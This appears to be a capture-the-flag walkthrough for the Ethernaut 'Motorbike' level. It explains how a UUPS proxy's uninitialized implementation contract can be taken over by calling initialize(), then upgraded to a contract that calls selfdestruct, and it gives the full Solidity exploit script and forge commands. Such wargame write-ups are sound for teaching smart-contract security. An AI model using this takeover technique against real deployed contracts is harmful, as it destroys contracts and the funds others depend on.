@@ -1,0 +1,116 @@
+"Our objective for this level is to call selfdestruct() on the implementation contract Engine and make the Proxy contract unusable. Let's see how we can do that. 
+selfdestruct()
+Engine
+This level is using a proxy pattern called UUPS (Universal Upgradeable Proxy Standard). The last one which we saw in Level 24 was a Transparent proxy pattern. 
+The difference is that in a UUPS proxy pattern, the contract upgrade logic will also be coded in the implementation contract and not the proxy contract. This allows the user to save some gas. This is how the structure looks:
+
+The other difference is that there's a storage slot defined in the proxy contract that stores the address of the logic contract. This is updated every time the logic contract is upgraded. This is to prevent storage collision. More on this can be read on EIP-1967. 
+In our case, the proxy contract is the Motorbike and the implementation/logic contract is Engine. 
+When we take a look at the proxy contract, we can see the storage slot defined as:
+bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+This slot is storing the address of the implementation contract. 
+When we look at the Engine contract, we can see that there's no selfdestruct() defined in the contract code. So how will we make a call to it? We will try to upgrade the implementation contract to point it to our deployed attacker contract. 
+selfdestruct()
+To upgrade the logic, the Engine contract defines a function called upgradeToAndCall():
+upgradeToAndCall()
+function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
+    _authorizeUpgrade();
+    _upgradeToAndCall(newImplementation, data);
+}
+function _authorizeUpgrade() internal view {
+    require(msg.sender == upgrader, ""Can't upgrade"");
+}
+
+This is calling _authorizeUpgrade() to check if the msg.sender is upgrader. Therefore, to upgrade the contract we need to make sure we are upgrader. So how do we become an upgrader? Let's take a look at the initialize() function:
+_authorizeUpgrade()
+msg.sender
+upgrader
+upgrader
+initialize()
+function initialize() external initializer {
+    horsePower = 1000;
+    upgrader = msg.sender;
+}
+
+initialize() is a special function used in UUPS-based contracts. And, along with initializer modifier, this acts as a constructor which can only be called once. (This is checked in the initializer modifier). 
+initialize()
+initializer
+initializer
+Something which should be observed here is that in this implementation, the initialize() function is supposed to be called by the proxy contract which it is doing. You can see in its constructor. But remember that it is doing so using a delegatecall(). And when a caller contract makes a delegate call to another contract, the caller contract's storage slots are updated using the code of the logic contract. 
+initialize()
+delegatecall()
+This means that the delegatecall() is being made in the context of the proxy contract and not the implementation.  
+delegatecall()
+So it is absolutely true that the proxy contract can only call the initialize() once and it'll update its storage values but what if we are to find the deployed address of the implementation contract and call the initialize() manually? In the context of the implementation contract, this has not yet been called. So if we are to call the function, our user (msg.sender) will become the upgrader. 
+initialize()
+initialize()
+msg.sender
+Once we become the upgrader we can just call the upgradeToAndCall() with our own contract's address in which we can create a selfdestruct() function. This should be enough to solve the level. 
+upgrader
+upgradeToAndCall()
+selfdestruct()
+Lets first create our attacker contract which will  house the selfdestruct() function:
+selfdestruct()
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Destructive {
+    function killed() external {
+        selfdestruct(address(0));
+    }    
+}
+
+Just a simple contract with selfdestruct() being called in the killed() external function. 
+selfdestruct()
+killed()
+This is how our exploit script looks:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""forge-std/Script.sol"";
+import ""../instances/Ilevel25.sol"";
+
+contract POC is Script {
+
+     Motorbike level25 = Motorbike(0xE7BaFbC26565E1047d1755B820Fa99Fb463a5BF4);
+     Engine engineAddress = Engine(address(uint160(uint256(vm.load(address(level25), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))));
+    function run() external{
+        vm.startBroadcast();
+
+        engineAddress.initialize();
+        console.log(""Upgrader is :"", engineAddress.upgrader());
+        bytes memory encodedData = abi.encodeWithSignature(""killed()"");
+        engineAddress.upgradeToAndCall(0x04dE0eA8556C85b94E61bC83B43d4FFb6DdC30F1, encodedData);
+
+        vm.stopBroadcast();
+    }
+}
+
+Motorbike level25
+Engine engineAddress
+vm.load(contract_address, slot_no)
+bytes32
+address(uint160(uint256()))
+await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
+
+engineAddress.initialize()
+initialize()
+console.log
+bytes memory encodedData
+upgradeToAndCall()
+engineAddress.upgradeToAndCall
+Once the call is made, the implementation contract will be changed to our deployed Destructive contract and the current implementation will make a delegatecall() to our contract's killed() function, destroying the contract. 
+Destructive
+delegatecall()
+killed()
+Deploy the Destructive contract and execute the script using the following commands:
+forge create Destructive --private-key $PKEY --rpc-url $RPC_URL
+forge script ./script/level25.sol --private-key $PKEY --broadcast --rpc-url $RPC_URL -vvvv
+
+Make sure to update the address of the Destructive contract in the exploit script. 
+
+The instance can now be submitted to finish the level. 
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry
+My article on setting up your workspace to get started with Ethernaut using Foundry and Solidity - blog.dixitaditya.com/getting-started-with-e..
+dev.to/nvn/ethernaut-hacks-level-25-motorbi.."
